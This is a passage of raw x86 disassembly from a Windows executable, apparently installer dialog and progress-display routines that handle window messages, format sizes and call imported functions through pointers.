  404141:	f7 c1 e0 ff ff ff    	test   $0xffffffe0,%ecx
  404147:	75 7c                	jne    0x4041c5
  404149:	f6 c1 02             	test   $0x2,%cl
  40414c:	8b 06                	mov    (%esi),%eax
  40414e:	57                   	push   %edi
  40414f:	8b 3d 24 92 40 00    	mov    0x409224,%edi
  404155:	74 03                	je     0x40415a
  404157:	50                   	push   %eax
  404158:	ff d7                	call   *%edi
  40415a:	f6 46 14 01          	testb  $0x1,0x14(%esi)
  40415e:	74 0a                	je     0x40416a
  404160:	50                   	push   %eax
  404161:	ff 75 08             	push   0x8(%ebp)
  404164:	ff 15 58 90 40 00    	call   *0x409058
  40416a:	ff 76 10             	push   0x10(%esi)
  40416d:	ff 75 08             	push   0x8(%ebp)
  404170:	ff 15 5c 90 40 00    	call   *0x40905c
  404176:	f6 46 14 08          	testb  $0x8,0x14(%esi)
  40417a:	8b 46 04             	mov    0x4(%esi),%eax
  40417d:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404180:	74 06                	je     0x404188
  404182:	50                   	push   %eax
  404183:	ff d7                	call   *%edi
  404185:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404188:	f6 46 14 04          	testb  $0x4,0x14(%esi)
  40418c:	5f                   	pop    %edi
  40418d:	74 0a                	je     0x404199
  40418f:	50                   	push   %eax
  404190:	ff 75 08             	push   0x8(%ebp)
  404193:	ff 15 4c 90 40 00    	call   *0x40904c
  404199:	f6 46 14 10          	testb  $0x10,0x14(%esi)
  40419d:	74 21                	je     0x4041c0
  40419f:	8b 46 08             	mov    0x8(%esi),%eax
  4041a2:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4041a5:	8b 46 0c             	mov    0xc(%esi),%eax
  4041a8:	85 c0                	test   %eax,%eax
  4041aa:	74 07                	je     0x4041b3
  4041ac:	50                   	push   %eax
  4041ad:	ff 15 50 90 40 00    	call   *0x409050
  4041b3:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4041b6:	50                   	push   %eax
  4041b7:	ff 15 64 90 40 00    	call   *0x409064
  4041bd:	89 46 0c             	mov    %eax,0xc(%esi)
  4041c0:	8b 46 0c             	mov    0xc(%esi),%eax
  4041c3:	eb 02                	jmp    0x4041c7
  4041c5:	33 c0                	xor    %eax,%eax
  4041c7:	5e                   	pop    %esi
  4041c8:	c9                   	leave
  4041c9:	c2 08 00             	ret    $0x8
  4041cc:	56                   	push   %esi
  4041cd:	6a fe                	push   $0xfffffffe
  4041cf:	be 80 95 42 00       	mov    $0x429580,%esi
  4041d4:	56                   	push   %esi
  4041d5:	e8 07 27 00 00       	call   0x4068e1
  4041da:	56                   	push   %esi
  4041db:	ff 35 f8 21 42 00    	push   0x4221f8
  4041e1:	ff 15 3c 92 40 00    	call   *0x40923c
  4041e7:	8b c6                	mov    %esi,%eax
  4041e9:	5e                   	pop    %esi
  4041ea:	c3                   	ret
  4041eb:	53                   	push   %ebx
  4041ec:	55                   	push   %ebp
  4041ed:	56                   	push   %esi
  4041ee:	57                   	push   %edi
  4041ef:	bf 00 70 43 00       	mov    $0x437000,%edi
  4041f4:	57                   	push   %edi
  4041f5:	be ff ff 00 00       	mov    $0xffff,%esi
  4041fa:	e8 28 22 00 00       	call   0x406427
  4041ff:	0f b7 d8             	movzwl %ax,%ebx
  404202:	8b 0d c4 a5 42 00    	mov    0x42a5c4,%ecx
  404208:	85 c9                	test   %ecx,%ecx
  40420a:	74 42                	je     0x40424e
  40420c:	a1 8c a5 42 00       	mov    0x42a58c,%eax
  404211:	8b 40 64             	mov    0x64(%eax),%eax
  404214:	8b d0                	mov    %eax,%edx
  404216:	0f af c1             	imul   %ecx,%eax
  404219:	f7 da                	neg    %edx
  40421b:	03 05 c0 a5 42 00    	add    0x42a5c0,%eax
  404221:	03 c2                	add    %edx,%eax
  404223:	66 8b 28             	mov    (%eax),%bp
  404226:	66 33 eb             	xor    %bx,%bp
  404229:	49                   	dec    %ecx
  40422a:	66 85 ee             	test   %bp,%si
  40422d:	74 06                	je     0x404235
  40422f:	85 c9                	test   %ecx,%ecx
  404231:	75 ee                	jne    0x404221
  404233:	eb 19                	jmp    0x40424e
  404235:	8b 48 02             	mov    0x2(%eax),%ecx
  404238:	89 0d 5c 95 42 00    	mov    %ecx,0x42955c
  40423e:	8b 48 06             	mov    0x6(%eax),%ecx
  404241:	89 0d 68 a6 42 00    	mov    %ecx,0x42a668
  404247:	8d 48 0a             	lea    0xa(%eax),%ecx
  40424a:	85 c9                	test   %ecx,%ecx
  40424c:	75 12                	jne    0x404260
  40424e:	66 81 fe ff ff       	cmp    $0xffff,%si
  404253:	75 07                	jne    0x40425c
  404255:	be ff 03 00 00       	mov    $0x3ff,%esi
  40425a:	eb a6                	jmp    0x404202
  40425c:	33 f6                	xor    %esi,%esi
  40425e:	eb a2                	jmp    0x404202
  404260:	89 0d 68 95 42 00    	mov    %ecx,0x429568
  404266:	0f b7 00             	movzwl (%eax),%eax
  404269:	50                   	push   %eax
  40426a:	57                   	push   %edi
  40426b:	e8 9e 21 00 00       	call   0x40640e
  404270:	e8 57 ff ff ff       	call   0x4041cc
  404275:	8b 35 a8 a5 42 00    	mov    0x42a5a8,%esi
  40427b:	8b 3d ac a5 42 00    	mov    0x42a5ac,%edi
  404281:	eb 17                	jmp    0x40429a
  404283:	8b 06                	mov    (%esi),%eax
  404285:	4f                   	dec    %edi
  404286:	85 c0                	test   %eax,%eax
  404288:	74 0a                	je     0x404294
  40428a:	50                   	push   %eax
  40428b:	8d 46 18             	lea    0x18(%esi),%eax
  40428e:	50                   	push   %eax
  40428f:	e8 4d 26 00 00       	call   0x4068e1
  404294:	81 c6 18 08 00 00    	add    $0x818,%esi
  40429a:	85 ff                	test   %edi,%edi
  40429c:	75 e5                	jne    0x404283
  40429e:	5f                   	pop    %edi
  40429f:	5e                   	pop    %esi
  4042a0:	5d                   	pop    %ebp
  4042a1:	5b                   	pop    %ebx
  4042a2:	c3                   	ret
  4042a3:	55                   	push   %ebp
  4042a4:	8b ec                	mov    %esp,%ebp
  4042a6:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  4042aa:	56                   	push   %esi
  4042ab:	8b 35 78 92 40 00    	mov    0x409278,%esi
  4042b1:	75 1c                	jne    0x4042cf
  4042b3:	ff 75 14             	push   0x14(%ebp)
  4042b6:	68 fb 03 00 00       	push   $0x3fb
  4042bb:	e8 d0 1c 00 00       	call   0x405f90
  4042c0:	ff 75 14             	push   0x14(%ebp)
  4042c3:	6a 01                	push   $0x1
  4042c5:	68 67 04 00 00       	push   $0x467
  4042ca:	ff 75 08             	push   0x8(%ebp)
  4042cd:	ff d6                	call   *%esi
  4042cf:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  4042d3:	75 2d                	jne    0x404302
  4042d5:	ff 75 14             	push   0x14(%ebp)
  4042d8:	ff 75 10             	push   0x10(%ebp)
  4042db:	ff 15 98 91 40 00    	call   *0x409198
  4042e1:	85 c0                	test   %eax,%eax
  4042e3:	74 0e                	je     0x4042f3
  4042e5:	6a 07                	push   $0x7
  4042e7:	e8 25 d1 ff ff       	call   0x401411
  4042ec:	85 c0                	test   %eax,%eax
  4042ee:	75 03                	jne    0x4042f3
  4042f0:	40                   	inc    %eax
  4042f1:	eb 02                	jmp    0x4042f5
  4042f3:	33 c0                	xor    %eax,%eax
  4042f5:	50                   	push   %eax
  4042f6:	6a 00                	push   $0x0
  4042f8:	68 65 04 00 00       	push   $0x465
  4042fd:	ff 75 08             	push   0x8(%ebp)
  404300:	ff d6                	call   *%esi
  404302:	33 c0                	xor    %eax,%eax
  404304:	5e                   	pop    %esi
  404305:	5d                   	pop    %ebp
  404306:	c2 10 00             	ret    $0x10
  404309:	55                   	push   %ebp
  40430a:	8b ec                	mov    %esp,%ebp
  40430c:	8b 45 10             	mov    0x10(%ebp),%eax
  40430f:	8b 0d fc 21 42 00    	mov    0x4221fc,%ecx
  404315:	d1 e8                	shr    $1,%eax
  404317:	50                   	push   %eax
  404318:	8b 45 08             	mov    0x8(%ebp),%eax
  40431b:	03 c8                	add    %eax,%ecx
  40431d:	51                   	push   %ecx
  40431e:	ff 75 0c             	push   0xc(%ebp)
  404321:	ff 15 b8 90 40 00    	call   *0x4090b8
  404327:	ff 75 0c             	push   0xc(%ebp)
  40432a:	ff 15 bc 90 40 00    	call   *0x4090bc
  404330:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404333:	03 c0                	add    %eax,%eax
  404335:	01 05 fc 21 42 00    	add    %eax,0x4221fc
  40433b:	89 01                	mov    %eax,(%ecx)
  40433d:	33 c0                	xor    %eax,%eax
  40433f:	5d                   	pop    %ebp
  404340:	c2 10 00             	ret    $0x10
  404343:	55                   	push   %ebp
  404344:	8b ec                	mov    %esp,%ebp
  404346:	a1 fc 21 42 00       	mov    0x4221fc,%eax
  40434b:	56                   	push   %esi
  40434c:	8b 75 08             	mov    0x8(%ebp),%esi
  40434f:	8d 04 46             	lea    (%esi,%eax,2),%eax
  404352:	50                   	push   %eax
  404353:	ff 15 bc 90 40 00    	call   *0x4090bc
  404359:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40435c:	d1 e9                	shr    $1,%ecx
  40435e:	3b c1                	cmp    %ecx,%eax
  404360:	72 02                	jb     0x404364
  404362:	8b c1                	mov    %ecx,%eax
  404364:	33 c9                	xor    %ecx,%ecx
  404366:	51                   	push   %ecx
  404367:	51                   	push   %ecx
  404368:	ff 75 10             	push   0x10(%ebp)
  40436b:	ff 75 0c             	push   0xc(%ebp)
  40436e:	50                   	push   %eax
  40436f:	a1 fc 21 42 00       	mov    0x4221fc,%eax
  404374:	8d 04 46             	lea    (%esi,%eax,2),%eax
  404377:	50                   	push   %eax
  404378:	51                   	push   %ecx
  404379:	51                   	push   %ecx
  40437a:	ff 15 b4 90 40 00    	call   *0x4090b4
  404380:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404383:	01 05 fc 21 42 00    	add    %eax,0x4221fc
  404389:	89 01                	mov    %eax,(%ecx)
  40438b:	33 c0                	xor    %eax,%eax
  40438d:	5e                   	pop    %esi
  40438e:	5d                   	pop    %ebp
  40438f:	c2 10 00             	ret    $0x10
  404392:	55                   	push   %ebp
  404393:	8b ec                	mov    %esp,%ebp
  404395:	83 ec 48             	sub    $0x48,%esp
  404398:	53                   	push   %ebx
  404399:	56                   	push   %esi
  40439a:	33 db                	xor    %ebx,%ebx
  40439c:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  4043a3:	57                   	push   %edi
  4043a4:	0f 85 17 01 00 00    	jne    0x4044c1
  4043aa:	8b 7d 14             	mov    0x14(%ebp),%edi
  4043ad:	8b 47 30             	mov    0x30(%edi),%eax
  4043b0:	3b c3                	cmp    %ebx,%eax
  4043b2:	7d 11                	jge    0x4043c5
  4043b4:	8b 0d 68 95 42 00    	mov    0x429568,%ecx
  4043ba:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  4043c1:	2b c8                	sub    %eax,%ecx
  4043c3:	8b 01                	mov    (%ecx),%eax
  4043c5:	8b 0d b8 a5 42 00    	mov    0x42a5b8,%ecx
  4043cb:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  4043ce:	0f b7 08             	movzwl (%eax),%ecx
  4043d1:	40                   	inc    %eax
  4043d2:	40                   	inc    %eax
  4043d3:	83 f9 02             	cmp    $0x2,%ecx
  4043d6:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  4043d9:	89 45 14             	mov    %eax,0x14(%ebp)
  4043dc:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4043df:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  4043e2:	c7 45 fc 43 43 40 00 	movl   $0x404343,-0x4(%ebp)
  4043e9:	74 07                	je     0x4043f2
  4043eb:	c7 45 fc 09 43 40 00 	movl   $0x404309,-0x4(%ebp)
  4043f2:	8b 47 14             	mov    0x14(%edi),%eax
  4043f5:	ff 77 34             	push   0x34(%edi)
  4043f8:	8b f0                	mov    %eax,%esi
  4043fa:	c1 ee 05             	shr    $0x5,%esi
  4043fd:	f7 d6                	not    %esi
  4043ff:	6a 22                	push   $0x22
  404401:	ff 75 08             	push   0x8(%ebp)
  404404:	0b f0                	or     %eax,%esi
  404406:	83 e6 01             	and    $0x1,%esi
  404409:	e8 67 fc ff ff       	call   0x404075
  40440e:	ff 77 38             	push   0x38(%edi)
  404411:	6a 23                	push   $0x23
  404413:	ff 75 08             	push   0x8(%ebp)
  404416:	e8 5a fc ff ff       	call   0x404075
  40441b:	33 c0                	xor    %eax,%eax
  40441d:	3b f3                	cmp    %ebx,%esi
  40441f:	0f 94 c0             	sete   %al
  404422:	6a 01                	push   $0x1
  404424:	05 0a 04 00 00       	add    $0x40a,%eax
  404429:	50                   	push   %eax
  40442a:	ff 75 08             	push   0x8(%ebp)
  40442d:	ff 15 14 92 40 00    	call   *0x409214
  404433:	56                   	push   %esi
  404434:	e8 82 fc ff ff       	call   0x4040bb
  404439:	68 e8 03 00 00       	push   $0x3e8
  40443e:	ff 75 08             	push   0x8(%ebp)
  404441:	ff 15 5c 92 40 00    	call   *0x40925c
  404447:	8b f8                	mov    %eax,%edi
  404449:	57                   	push   %edi
  40444a:	e8 7f fc ff ff       	call   0x4040ce
  40444f:	8b 35 78 92 40 00    	mov    0x409278,%esi
  404455:	53                   	push   %ebx
  404456:	6a 01                	push   $0x1
  404458:	68 5b 04 00 00       	push   $0x45b
  40445d:	57                   	push   %edi
  40445e:	ff d6                	call   *%esi
  404460:	a1 8c a5 42 00       	mov    0x42a58c,%eax
  404465:	8b 40 68             	mov    0x68(%eax),%eax
  404468:	3b c3                	cmp    %ebx,%eax
  40446a:	7d 09                	jge    0x404475
  40446c:	f7 d8                	neg    %eax
  40446e:	50                   	push   %eax
  40446f:	ff 15 24 92 40 00    	call   *0x409224
  404475:	50                   	push   %eax
  404476:	53                   	push   %ebx
  404477:	68 43 04 00 00       	push   $0x443
  40447c:	57                   	push   %edi
  40447d:	ff d6                	call   *%esi
  40447f:	68 00 00 01 04       	push   $0x4010000
  404484:	53                   	push   %ebx
  404485:	68 45 04 00 00       	push   $0x445
  40448a:	57                   	push   %edi
  40448b:	ff d6                	call   *%esi
  40448d:	ff 75 14             	push   0x14(%ebp)
  404490:	e8 48 20 00 00       	call   0x4064dd
  404495:	50                   	push   %eax
  404496:	53                   	push   %ebx
  404497:	68 35 04 00 00       	push   $0x435
  40449c:	57                   	push   %edi
  40449d:	ff d6                	call   *%esi
  40449f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4044a2:	50                   	push   %eax
  4044a3:	ff 75 0c             	push   0xc(%ebp)
  4044a6:	89 1d fc 21 42 00    	mov    %ebx,0x4221fc
  4044ac:	68 49 04 00 00       	push   $0x449
  4044b1:	57                   	push   %edi
  4044b2:	ff d6                	call   *%esi
  4044b4:	89 1d fc 21 42 00    	mov    %ebx,0x4221fc
  4044ba:	33 c0                	xor    %eax,%eax
  4044bc:	e9 7e 01 00 00       	jmp    0x40463f
  4044c1:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  4044c8:	8b 35 78 92 40 00    	mov    0x409278,%esi
  4044ce:	75 5c                	jne    0x40452c
  4044d0:	8b 45 10             	mov    0x10(%ebp),%eax
  4044d3:	c1 e8 10             	shr    $0x10,%eax
  4044d6:	66 85 c0             	test   %ax,%ax
  4044d9:	0f 85 51 01 00 00    	jne    0x404630
  4044df:	39 1d fc 21 42 00    	cmp    %ebx,0x4221fc
  4044e5:	0f 85 45 01 00 00    	jne    0x404630
  4044eb:	8b 3d 04 5a 42 00    	mov    0x425a04,%edi
  4044f1:	83 c7 14             	add    $0x14,%edi
  4044f4:	f6 07 20             	testb  $0x20,(%edi)
  4044f7:	0f 84 33 01 00 00    	je     0x404630
  4044fd:	53                   	push   %ebx
  4044fe:	53                   	push   %ebx
  4044ff:	68 f0 00 00 00       	push   $0xf0
  404504:	68 0a 04 00 00       	push   $0x40a
  404509:	ff 75 08             	push   0x8(%ebp)
  40450c:	ff 15 5c 92 40 00    	call   *0x40925c
  404512:	50                   	push   %eax
  404513:	ff d6                	call   *%esi
  404515:	8b 0f                	mov    (%edi),%ecx
  404517:	83 e0 01             	and    $0x1,%eax
  40451a:	83 e1 fe             	and    $0xfffffffe,%ecx
  40451d:	0b c8                	or     %eax,%ecx
  40451f:	50                   	push   %eax
  404520:	89 0f                	mov    %ecx,(%edi)
  404522:	e8 94 fb ff ff       	call   0x4040bb
  404527:	e8 6b fb ff ff       	call   0x404097
  40452c:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  404530:	0f 85 eb 00 00 00    	jne    0x404621
  404536:	68 e8 03 00 00       	push   $0x3e8
  40453b:	ff 75 08             	push   0x8(%ebp)
  40453e:	ff 15 5c 92 40 00    	call   *0x40925c
  404544:	8b 7d 14             	mov    0x14(%ebp),%edi
  404547:	81 7f 08 0b 07 00 00 	cmpl   $0x70b,0x8(%edi)
  40454e:	0f 85 8e 00 00 00    	jne    0x4045e2
  404554:	81 7f 0c 01 02 00 00 	cmpl   $0x201,0xc(%edi)
  40455b:	0f 85 81 00 00 00    	jne    0x4045e2
  404561:	8b 4f 1c             	mov    0x1c(%edi),%ecx
  404564:	8b 57 18             	mov    0x18(%edi),%edx
  404567:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40456a:	2b ca                	sub    %edx,%ecx
  40456c:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  404572:	89 55 f4             	mov    %edx,-0xc(%ebp)
  404575:	c7 45 fc 20 85 42 00 	movl   $0x428520,-0x4(%ebp)
  40457c:	73 64                	jae    0x4045e2
  40457e:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  404581:	51                   	push   %ecx
  404582:	53                   	push   %ebx
  404583:	68 4b 04 00 00       	push   $0x44b
  404588:	50                   	push   %eax
  404589:	ff d6                	call   *%esi
  40458b:	8b 3d 18 92 40 00    	mov    0x409218,%edi
  404591:	68 02 7f 00 00       	push   $0x7f02
  404596:	53                   	push   %ebx
  404597:	ff d7                	call   *%edi
  404599:	50                   	push   %eax
  40459a:	ff 15 a4 92 40 00    	call   *0x4092a4
  4045a0:	8b 45 08             	mov    0x8(%ebp),%eax
  4045a3:	89 45 c0             	mov    %eax,-0x40(%ebp)
  4045a6:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4045a9:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4045ac:	8d 45 b8             	lea    -0x48(%ebp),%eax
  4045af:	50                   	push   %eax
  4045b0:	c7 45 bc 00 05 00 00 	movl   $0x500,-0x44(%ebp)
  4045b7:	c7 45 d4 01 00 00 00 	movl   $0x1,-0x2c(%ebp)
  4045be:	c7 45 c4 60 96 40 00 	movl   $0x409660,-0x3c(%ebp)
  4045c5:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  4045c8:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  4045cb:	e8 a2 19 00 00       	call   0x405f72
  4045d0:	68 00 7f 00 00       	push   $0x7f00
  4045d5:	53                   	push   %ebx
  4045d6:	ff d7                	call   *%edi
  4045d8:	50                   	push   %eax
  4045d9:	ff 15 a4 92 40 00    	call   *0x4092a4
  4045df:	8b 7d 14             	mov    0x14(%ebp),%edi
  4045e2:	81 7f 08 00 07 00 00 	cmpl   $0x700,0x8(%edi)
  4045e9:	75 48                	jne    0x404633
  4045eb:	81 7f 0c 00 01 00 00 	cmpl   $0x100,0xc(%edi)
  4045f2:	75 3f                	jne    0x404633
  4045f4:	83 7f 10 0d          	cmpl   $0xd,0x10(%edi)
  4045f8:	75 10                	jne    0x40460a
  4045fa:	53                   	push   %ebx
  4045fb:	6a 01                	push   $0x1
  4045fd:	68 11 01 00 00       	push   $0x111
  404602:	ff 35 84 a5 42 00    	push   0x42a584
  404608:	ff d6                	call   *%esi
  40460a:	83 7f 10 1b          	cmpl   $0x1b,0x10(%edi)
  40460e:	75 0c                	jne    0x40461c
  404610:	53                   	push   %ebx
  404611:	53                   	push   %ebx
  404612:	6a 10                	push   $0x10
  404614:	ff 35 84 a5 42 00    	push   0x42a584
  40461a:	ff d6                	call   *%esi
  40461c:	33 c0                	xor    %eax,%eax
  40461e:	40                   	inc    %eax
  40461f:	eb 1e                	jmp    0x40463f
  404621:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404628:	75 06                	jne    0x404630
  40462a:	ff 05 fc 21 42 00    	incl   0x4221fc
  404630:	8b 7d 14             	mov    0x14(%ebp),%edi
  404633:	8b 45 0c             	mov    0xc(%ebp),%eax
  404636:	57                   	push   %edi
  404637:	ff 75 10             	push   0x10(%ebp)
  40463a:	e8 c1 fa ff ff       	call   0x404100
  40463f:	5f                   	pop    %edi
  404640:	5e                   	pop    %esi
  404641:	5b                   	pop    %ebx
  404642:	c9                   	leave
  404643:	c2 10 00             	ret    $0x10
  404646:	55                   	push   %ebp
  404647:	8b ec                	mov    %esp,%ebp
  404649:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404650:	56                   	push   %esi
  404651:	8b 75 14             	mov    0x14(%ebp),%esi
  404654:	75 26                	jne    0x40467c
  404656:	ff 76 30             	push   0x30(%esi)
  404659:	6a 1d                	push   $0x1d
  40465b:	ff 75 08             	push   0x8(%ebp)
  40465e:	e8 12 fa ff ff       	call   0x404075
  404663:	8b 46 3c             	mov    0x3c(%esi),%eax
  404666:	c1 e0 0b             	shl    $0xb,%eax
  404669:	05 00 b0 42 00       	add    $0x42b000,%eax
  40466e:	50                   	push   %eax
  40466f:	68 e8 03 00 00       	push   $0x3e8
  404674:	ff 75 08             	push   0x8(%ebp)
  404677:	e8 0e 19 00 00       	call   0x405f8a
  40467c:	8b 45 0c             	mov    0xc(%ebp),%eax
  40467f:	56                   	push   %esi
  404680:	ff 75 10             	push   0x10(%ebp)
  404683:	e8 78 fa ff ff       	call   0x404100
  404688:	5e                   	pop    %esi
  404689:	5d                   	pop    %ebp
  40468a:	c2 10 00             	ret    $0x10
  40468d:	55                   	push   %ebp
  40468e:	8b ec                	mov    %esp,%ebp
  404690:	81 ec 84 00 00 00    	sub    $0x84,%esp
  404696:	8b 45 14             	mov    0x14(%ebp),%eax
  404699:	85 c0                	test   %eax,%eax
  40469b:	53                   	push   %ebx
  40469c:	56                   	push   %esi
  40469d:	57                   	push   %edi
  40469e:	c7 45 fc dc ff ff ff 	movl   $0xffffffdc,-0x4(%ebp)
  4046a5:	74 0e                	je     0x4046b5
  4046a7:	8b 7d 10             	mov    0x10(%ebp),%edi
  4046aa:	0f ac c7 14          	shrd   $0x14,%eax,%edi
  4046ae:	c1 e8 14             	shr    $0x14,%eax
  4046b1:	33 db                	xor    %ebx,%ebx
  4046b3:	eb 57                	jmp    0x40470c
  4046b5:	8b 75 10             	mov    0x10(%ebp),%esi
  4046b8:	81 fe 00 00 10 00    	cmp    $0x100000,%esi
  4046be:	6a 14                	push   $0x14
  4046c0:	59                   	pop    %ecx
  4046c1:	8b c6                	mov    %esi,%eax
  4046c3:	73 0a                	jae    0x4046cf
  4046c5:	6a 0a                	push   $0xa
  4046c7:	59                   	pop    %ecx
  4046c8:	c7 45 fc dd ff ff ff 	movl   $0xffffffdd,-0x4(%ebp)
  4046cf:	81 fe 00 04 00 00    	cmp    $0x400,%esi
  4046d5:	73 09                	jae    0x4046e0
  4046d7:	33 c9                	xor    %ecx,%ecx
  4046d9:	c7 45 fc de ff ff ff 	movl   $0xffffffde,-0x4(%ebp)
  4046e0:	81 fe 33 33 ff ff    	cmp    $0xffff3333,%esi
  4046e6:	73 0d                	jae    0x4046f5
  4046e8:	33 c0                	xor    %eax,%eax
  4046ea:	40                   	inc    %eax
  4046eb:	d3 e0                	shl    %cl,%eax
  4046ed:	6a 14                	push   $0x14
  4046ef:	5f                   	pop    %edi
  4046f0:	99                   	cltd
  4046f1:	f7 ff                	idiv   %edi
  4046f3:	03 c6                	add    %esi,%eax
  4046f5:	8b f8                	mov    %eax,%edi
  4046f7:	25 ff ff ff 00       	and    $0xffffff,%eax
  4046fc:	6b c0 0a             	imul   $0xa,%eax,%eax
  4046ff:	d3 e8                	shr    %cl,%eax
  404701:	d3 ef                	shr    %cl,%edi
  404703:	6a 0a                	push   $0xa
  404705:	33 d2                	xor    %edx,%edx
  404707:	59                   	pop    %ecx
  404708:	f7 f1                	div    %ecx
  40470a:	8b da                	mov    %edx,%ebx
  40470c:	ff 75 0c             	push   0xc(%ebp)
  40470f:	be 00 3a 42 00       	mov    $0x423a00,%esi
  404714:	56                   	push   %esi
  404715:	e8 c7 21 00 00       	call   0x4068e1
  40471a:	6a df                	push   $0xffffffdf
  40471c:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40471f:	50                   	push   %eax
  404720:	e8 bc 21 00 00       	call   0x4068e1
  404725:	50                   	push   %eax
  404726:	ff 75 fc             	push   -0x4(%ebp)
  404729:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  40472f:	50                   	push   %eax
  404730:	e8 ac 21 00 00       	call   0x4068e1
  404735:	50                   	push   %eax
  404736:	53                   	push   %ebx
  404737:	57                   	push   %edi
  404738:	68 6c 96 40 00       	push   $0x40966c
  40473d:	56                   	push   %esi
  40473e:	e8 9a 1d 00 00       	call   0x4064dd
  404743:	8d 04 45 00 3a 42 00 	lea    0x423a00(,%eax,2),%eax
  40474a:	50                   	push   %eax
  40474b:	ff 15 4c 92 40 00    	call   *0x40924c
  404751:	83 c4 18             	add    $0x18,%esp
  404754:	56                   	push   %esi
  404755:	ff 75 08             	push   0x8(%ebp)
  404758:	ff 35 48 95 42 00    	push   0x429548
  40475e:	e8 27 18 00 00       	call   0x405f8a
  404763:	5f                   	pop    %edi
  404764:	5e                   	pop    %esi
  404765:	5b                   	pop    %ebx
  404766:	c9                   	leave
  404767:	c2 10 00             	ret    $0x10
  40476a:	8b 15 ac a5 42 00    	mov    0x42a5ac,%edx
  404770:	8b 0d a8 a5 42 00    	mov    0x42a5a8,%ecx
  404776:	33 c0                	xor    %eax,%eax
  404778:	85 d2                	test   %edx,%edx
  40477a:	74 1a                	je     0x404796
  40477c:	56                   	push   %esi
  40477d:	4a                   	dec    %edx
  40477e:	f6 41 08 01          	testb  $0x1,0x8(%ecx)
  404782:	74 07                	je     0x40478b
  404784:	8b 74 24 08          	mov    0x8(%esp),%esi
  404788:	03 04 b1             	add    (%ecx,%esi,4),%eax
  40478b:	81 c1 18 08 00 00    	add    $0x818,%ecx
  404791:	85 d2                	test   %edx,%edx
  404793:	75 e8                	jne    0x40477d
  404795:	5e                   	pop    %esi
  404796:	c2 04 00             	ret    $0x4
  404799:	55                   	push   %ebp
  40479a:	8b ec                	mov    %esp,%ebp
  40479c:	83 ec 4c             	sub    $0x4c,%esp
  40479f:	a1 04 5a 42 00       	mov    0x425a04,%eax
  4047a4:	53                   	push   %ebx
  4047a5:	8b 58 3c             	mov    0x3c(%eax),%ebx
  4047a8:	c1 e3 0b             	shl    $0xb,%ebx
  4047ab:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4047ae:	8b 40 38             	mov    0x38(%eax),%eax
  4047b1:	56                   	push   %esi
  4047b2:	81 c3 00 b0 42 00    	add    $0x42b000,%ebx
  4047b8:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  4047bf:	57                   	push   %edi
  4047c0:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4047c3:	75 11                	jne    0x4047d6
  4047c5:	53                   	push   %ebx
  4047c6:	68 fb 03 00 00       	push   $0x3fb
  4047cb:	e8 c0 17 00 00       	call   0x405f90
  4047d0:	53                   	push   %ebx
  4047d1:	e8 2e 1d 00 00       	call   0x406504
  4047d6:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  4047dd:	8b 75 08             	mov    0x8(%ebp),%esi
  4047e0:	75 6c                	jne    0x40484e
  4047e2:	68 fb 03 00 00       	push   $0x3fb
  4047e7:	56                   	push   %esi
  4047e8:	ff 15 5c 92 40 00    	call   *0x40925c
  4047ee:	53                   	push   %ebx
  4047ef:	8b f8                	mov    %eax,%edi
  4047f1:	e8 39 18 00 00       	call   0x40602f
  4047f6:	85 c0                	test   %eax,%eax
  4047f8:	74 10                	je     0x40480a
  4047fa:	53                   	push   %ebx
  4047fb:	e8 64 18 00 00       	call   0x406064
  404800:	85 c0                	test   %eax,%eax
  404802:	75 06                	jne    0x40480a
  404804:	53                   	push   %ebx
  404805:	e8 ae 1f 00 00       	call   0x4067b8
  40480a:	53                   	push   %ebx
  40480b:	57                   	push   %edi
  40480c:	89 35 48 95 42 00    	mov    %esi,0x429548
  404812:	ff 15 3c 92 40 00    	call   *0x40923c
  404818:	8b 45 14             	mov    0x14(%ebp),%eax
  40481b:	ff 70 34             	push   0x34(%eax)
  40481e:	6a 01                	push   $0x1
  404820:	56                   	push   %esi
  404821:	e8 4f f8 ff ff       	call   0x404075
  404826:	8b 45 14             	mov    0x14(%ebp),%eax
  404829:	ff 70 30             	push   0x30(%eax)
  40482c:	6a 14                	push   $0x14
  40482e:	56                   	push   %esi
  40482f:	e8 41 f8 ff ff       	call   0x404075
  404834:	57                   	push   %edi
  404835:	e8 94 f8 ff ff       	call   0x4040ce
  40483a:	6a 0a                	push   $0xa
  40483c:	e8 09 1e 00 00       	call   0x40664a
  404841:	85 c0                	test   %eax,%eax
  404843:	0f 84 96 02 00 00    	je     0x404adf
  404849:	6a 01                	push   $0x1
  40484b:	57                   	push   %edi
  40484c:	ff d0                	call   *%eax
  40484e:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404855:	0f 85 d1 00 00 00    	jne    0x40492c
